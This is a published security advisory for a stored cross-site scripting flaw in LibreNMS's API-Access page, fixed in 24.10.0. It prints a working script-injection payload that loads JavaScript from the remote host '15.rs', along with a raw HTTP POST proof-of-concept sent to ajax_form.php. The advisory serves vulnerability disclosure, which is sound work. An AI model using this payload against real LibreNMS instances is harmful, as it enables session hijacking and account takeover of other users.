# Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/api-access.inc.php

High

[murrant](/murrant)
published
GHSA-gfwr-xqmj-j27v
Nov 15, 2024

## Package

librenms/includes/html/pages/api-access.inc.php
(LibreNMS)

## Affected versions

<= 24.9.1

## Patched versions

24.10.0

## Description

### Summary

A Stored Cross-Site Scripting (XSS) vulnerability in the API-Access page allows authenticated users to inject arbitrary JavaScript through the "token" parameter when creating a new API token. This vulnerability can result in the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.

### Details

The vulnerability occurs when creating a new API Token. An attacker can inject arbitrary JavaScript into the "token" parameter, which is then executed when the API Access page is visited. The payload is triggered twice—once in the "Token Hash" column and once in the "QR Code" column.

The payload used to exploit this vulnerability is: `'"><script/src=//15.rs></script>`

Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

The vulnerability is due to insufficient sanitization of the "token\_hash" variable before it is output in the HTML. This is evident in the following lines of code:

[librenms/includes/html/pages/api-access.inc.php](https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L152)

| --- | --- |

### PoC

1. Create a new API token with the following payload in the "token" parameter: `'"><script/src=//15.rs></script>`
2. Save the token.
3. Navigate to the API Access page.
4. Observe that the injected script executes twice, once in the "Token Hash" column and once in the "QR Code" column.

```
POST /ajax_form.php HTTP/1.1
Host: <your_host>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-TOKEN: <your_token>
X-Requested-With: XMLHttpRequest
Cookie: <your_cookie>

_token=<your_token>&user_id=1&token='"><script/src=//15.rs></script>&description=t'"><script/src=//15.rs>&type=token-item-create
```
### Impact

The vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. This can lead to account compromise and enable unauthorized actions on behalf of the impacted users.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
